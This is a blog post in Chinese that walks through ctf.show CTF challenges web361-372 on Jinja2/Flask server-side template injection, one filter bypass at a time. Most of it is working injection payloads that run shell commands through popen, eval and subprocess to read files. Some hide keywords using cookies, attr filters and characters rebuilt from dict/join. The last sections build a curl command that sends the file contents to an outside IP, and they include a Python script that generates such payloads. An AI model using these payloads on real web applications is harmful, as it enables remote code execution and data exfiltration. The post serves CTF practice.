---
title: Web入门_SSTI
author: Creexile
date: 2024-12-02 21:25:01
lastMod: 2025-08-29
summary: 'web361-372'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [SSTI, CTF]
---

# Web入门\_SSTI

---

web361-372

服务器端模板注入, 服务端接收攻击者的恶意输入以后, 未经任何处理就将其作为 Web 应用模板内容的一部分; 模板引擎在进行目标编译渲染的过程中,执行了攻击者插入的语句

## web361

- 描述: 名字就是考点

GET传参`?name={{7*7}}`, 返回49, 说明此处为利用点; 用最传统的popen方法来执行命令

```python
?name={{"".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']("cat /flag").read()}}
# 或
?name={{config.__class__.__init__.__globals__['os'].popen('more /flag').read()}}
```

## web362

- 描述: 开始过滤

过滤了2,3等数据, 使得`os._wrap_close`这个类没法使用, 但是我们还是用的popen构造; 或者利用flask的内置方法执行命令

```python
?name={{config.__class__.__init__.__globals__['__builtins__'].eval("__import__('os').popen('tac /f*').read()")}}
# 运算获得同样的数据:
?name={{''.__class__.__base__.__subclasses__()[140-8].__init__.__globals__['popen']'cat /flag').read()}}
# flask的内置lipsum方法, 自带os模块
?name={{lipsum.__globals__.get('os').popen('cat /flag').read()}}
```

## web363

- 描述: 同上

单引号被过滤, 可以使用`request.args.x`代替, 这个需要启用`os._wrap_close`模块, 发现在132位置有这个模块

```python
# 所有模块
?name={{().__class__.__base__.__subclasses__()}}
```

利用该模块传参

```python
?name={{x.__init__.__globals__[request.args.x1].eval(request.args.x2)}}&x1=__builtins__&x2=__import__('os').popen('cat /flag').read()&x=().__class__.__bases__[0].__subclasses__()[80]

?name={{().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.args.popen](request.args.param).read()}}&popen=popen&param=cat+/flag
```

还可以换一个get传参绕过

```python
?name={{().__class__.__mro__[1].__subclasses__()[407](request.args.a,shell=True,stdout=-1).communicate()[0]}}&a=cat /flag
```

## web364

- 描述: 同上

禁用了`args`, 可以使用`request.values.a`

```python
?name={{().__class__.__mro__[1].__subclasses__()[407](request.values.a,shell=True,stdout=-1).communicate()[0]}}&a=cat /flag
```

利用`cookie`传参:

```python
?name={{().__class__.__bases__[0].__subclasses__()[80].__init__.__globals__[request.cookies.x1].eval(request.cookies.x2)}}
# cookie
x1=__builtins__;x2=__import__('os').popen('cat /flag').read()
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241024221716.png)

## web365

- 描述: 同上

过滤方括号, 用魔术方法**getitem**来代替方括号

```python
?name={{().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(407)(request.values.a,shell=True,stdout=-1).communicate().__getitem__(0)}}&a=cat /flag
```

## web366

- 描述: 同上

过滤中括号, 下划线, 单引号, 双引号, globals, getitem args; 换一个类获取popen方法, 这个是flask的内置类

```python
?name={{lipsum.__globals__.os.popen(request.values.a).read()}}&a =cat /flag
```

再利用filters中的attr来过滤下划, [官方文档](https://jinja.palletsprojects.com/en/2.11.x/templates/#attr)

```python
?name={{(lipsum | attr(request.values.b)).os.popen(request.values.a).read()}}&a=cat /flag&b=__globals__
```

或者不换, 用flask过滤器, `""|attr("__class__")`相当于`"".__class__`

> x是jiaja2框架中的特殊类, 此处`x.__init__`变成了类的实例

```python
?name={{(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).eval(request.cookies.x5)}}
# cookie:
x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__('os').popen('cat /flag').read()
```

## web367

- 描述: 同上

过滤了os, 可以通过GET传参绕过,或者直接用web366的也行; payload如下:

```python
?name={{(lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.e)).read()}}&a=__globals__&b=__getitem__&c=os&d=popen&e=tac /flag
```

## web368

- 描述: 同上

过滤了`{{`, 可以用`{%print(...)%}`绕过

```python
?name={%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %}&a=__globals__&b=os&c=cat /flag
# cookie:
x1= __globals__;x2=os;x3=tac /flag
```

## web369

- 描述: 同上

过滤request, 如果不想搞花里胡哨的就直接用set构造字符吧

```python
?name=
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(24)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}
{%print(x.open(file).read())%}
```

就是分别构造所需要的字符, 然后拼接在一起

```
利用dict()|join拼接得到po = pop
利用pop构造下划线: a = _
利用上面的内容构造函数: ini = __init__
同理构造 glo = __globals__, geti = __getitem__, buile = __builtins__
构造payload, 准备最后拼接命令
最后构造file = '/flag'
```

## web370

- 描述: 同上

数字也被过滤了, 先获取数字:

```python
?name={%set one=dict(c=a)|join|count%}
{%set two=dict(cc=a)|join|count%}
{%set three=dict(ccc=a)|join|count%}
{%set four=dict(cccc=a)|join|count%}
{%set five=dict(ccccc=a)|join|count%}
{%set six=dict(cccccc=a)|join|count%}
{%set seven=dict(ccccccc=a)|join|count%}
{%set eight=dict(cccccccc=a)|join|count%}
{%set nine=dict(ccccccccc=a)|join|count%}
{%print (one,two,three,four,five,six,seven,eight,nine)%}
```

我们的最终payload如下:

```python
(lipsum|attr("__globals__").get("os").popen("cat /flag").read()
```

现在获取我们需要的字符串

```python
?name=
{%set pop=dict(pop=a)|join%}    # pop
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(three*eight)%}{%print xiahuaxian%}    # 下划线
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}    # globals
{%set% get=dict(get=a)|join%}    # get
{%set shell=dict(o=a,s=b)|join%}    # os
{%set popen=dict(popen=a)|join%}    # popen
{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}    #  builtins
{%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(dict(chr=a)|join)%}    # char
{%set read=dict(read=a)|join%}    # read
```

最后构建:

```python
http://72f41f67-ebc9-49ef-b8b0-77bce7aac9a2.challenge.ctf.show/
?name={%set one=dict(c=a)|join|count%}
{%set two=dict(cc=a)|join|count%}
{%set three=dict(ccc=a)|join|count%}
{%set four=dict(cccc=a)|join|count%}
{%set five=dict(ccccc=a)|join|count%}
{%set six=dict(cccccc=a)|join|count%}
{%set seven=dict(ccccccc=a)|join|count%}
{%set eight=dict(cccccccc=a)|join|count%}
{%set nine=dict(ccccccccc=a)|join|count%}
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(three*eight)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set get=dict(get=a)|join%}
{%set shell=dict(o=a,s=b)|join%}
{%set popen=dict(popen=a)|join%}
{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(dict(chr=a)|join)%}
{%set command=char(five*five*four-one)%2bchar(five*five*four-three)%2bchar(four*five*six-four)%2bchar(four*eight)%2bchar(six*eight-one)%2bchar(three*six*six-six)%2bchar(three*six*six)%2bchar(five*five*four-three)%2bchar(three*six*six-five)%}
{%set read=dict(read=a)|join%}
{%print (lipsum|attr(globals))|attr(get)(shell)|attr(popen)(command)|attr(read)()%}
```

## web371

- 描述: 同上

print被过滤了, 我们只能使用curl带外才能获得flag

同样是利用`lipsum`获取`popen`方法, 执行`curl http://ip:1111/open(‘/flag’).read()`, 将返回结果外带, 下面的payload中那一大串构建的就是ip

```python
?name={%set one=dict(c=a)|join|count%}
{%set two=dict(cc=a)|join|count%}
{%set three=dict(ccc=a)|join|count%}
{%set four=dict(cccc=a)|join|count%}
{%set five=dict(ccccc=a)|join|count%}
{%set six=dict(cccccc=a)|join|count%}
{%set seven=dict(ccccccc=a)|join|count%}
{%set eight=dict(cccccccc=a)|join|count%}
{%set nine=dict(ccccccccc=a)|join|count%}
{%set pop=dict(pop=a)|join%}
{%set kongge=(()|select|string|list)|attr(pop)(five*two)%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(three*eight)%}
{%set maohao=(config|string|list)|attr(pop)(two*seven)%}
{%set xiegang=(config|string|list)|attr(pop)(-eight*eight)%}
{%set dian=(config|string|list)|attr(pop)(five*five*eight-nine)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set get=dict(get=a)|join%}
{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set open=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(dict(open=a)|join)%}
{%set file=open((xiegang,dict(flag=a)|join)|join)|attr(dict(read=a)|join)()%}
{%set command=(dict(curl=a)|join,kongge,dict(http=a)|join,maohao,xiegang,xiegang,three,nine,dian,one,one-one,seven,dian,one,one-one,seven,dian,eight,four,maohao,one,one,one,one,xiegang,file)|join%}
{%set shell=(lipsum|attr(globals))|attr(get)(dict(o=a,s=b)|join)|attr(dict(popen=a)|join)(command)%}
```

这是一个外带脚本

```python
import requests
cmd='__import__("os").popen("curl http://ip:4567?p=`cat /flag`").read()'
# 这里ip需要更改
def fun1(s):
	t=[]
	for i in range(len(s)):
		t.append(ord(s[i]))
	k=''
	t=list(set(t))
	for i in t:
		k+='{% set '+'e'*(t.index(i)+1)+'=dict('+'e'*i+'=a)|join|count%}\n'
	return k
def fun2(s):
	t=[]
	for i in range(len(s)):
		t.append(ord(s[i]))
	t=list(set(t))
	k=''
	for i in range(len(s)):
		if i<len(s)-1:
			k+='chr('+'e'*(t.index(ord(s[i]))+1)+')%2b'
		else:
			k+='chr('+'e'*(t.index(ord(s[i]))+1)+')'
	return k
url ='http://68f8cbd4-f452-4d69-b382-81eafed22f3f.chall.ctf.show/?name='+fun1(cmd)+'''
{% set coun=dict(eeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(coun)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set cmd='''+fun2(cmd)+'''
%}
{%if x.eval(cmd)%}
abc
{%endif%}
'''
print(url)
```

## web372

- 描述: 同上

过滤count, 可以用length绕过

```python
?name={%set one=dict(c=a)|join|length%}
{%set two=dict(cc=a)|join|length%}
{%set three=dict(ccc=a)|join|length%}
{%set four=dict(cccc=a)|join|length%}
{%set five=dict(ccccc=a)|join|length%}
{%set six=dict(cccccc=a)|join|length%}
{%set seven=dict(ccccccc=a)|join|length%}
{%set eight=dict(cccccccc=a)|join|length%}
{%set nine=dict(ccccccccc=a)|join|length%}
{%set pop=dict(pop=a)|join%}
{%set kongge=(()|select|string|list)|attr(pop)(five*two)%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(three*eight)%}
{%set maohao=(config|string|list)|attr(pop)(two*seven)%}
{%set xiegang=(config|string|list)|attr(pop)(-eight*eight)%}
{%set dian=(config|string|list)|attr(pop)(five*five*eight-nine)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set get=dict(get=a)|join%}
{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set open=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(dict(open=a)|join)%}
{%set file=open((xiegang,dict(flag=a)|join)|join)|attr(dict(read=a)|join)()%}
{%set command=(dict(curl=a)|join,kongge,dict(http=a)|join,maohao,xiegang,xiegang,three,nine,dian,one,one-one,seven,dian,one,one-one,seven,dian,eight,four,maohao,one,one,one,one,xiegang,file)|join%}
{%set shell=(lipsum|attr(globals))|attr(get)(dict(o=a,s=b)|join)|attr(dict(popen=a)|join)(command)%}
```

相关文件:

- [[../../../ctf/ctf基础/SSTI]]
